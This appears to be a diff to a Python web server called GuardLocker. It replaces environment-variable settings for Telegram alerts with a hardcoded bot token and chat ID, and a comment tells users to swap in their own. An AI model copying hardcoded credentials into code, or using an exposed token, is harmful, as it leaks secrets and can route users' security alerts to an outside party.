@@ -1,3 +1,4 @@
+
 #!/usr/bin/env python3
 """
 GuardLocker Web Server - ENHANCED VERSION
@@ -39,8 +40,8 @@ app.secret_key = secrets.token_hex(32)
 
 # ============ TELEGRAM CONFIGURATION ============
 # Set these environment variables or edit here:
-TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '')  # Get from @BotFather
-TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID', '')     # Your chat ID
+TELEGRAM_BOT_TOKEN = '8511379034:AAEH4QNCBQWBXjm5uytYf5-jDAXmHvpk3jg'# os.getenv('TELEGRAM_BOT_TOKEN', '')  # remove added telegram bot then get your token from here  @BotFather
+TELEGRAM_CHAT_ID = '5590835443' #os.getenv('TELEGRAM_CHAT_ID', '')     # # remove added telegram bot then get Your chat ID
 
 def send_telegram_alert(message: str, is_critical: bool = True):
     """
@@ -686,6 +687,7 @@ def test_telegram():
         "This is a test message from GuardLocker.\n"
         "If you received this, Telegram alerts are working!",
         is_critical=False
+        
     )
     
     return jsonify({
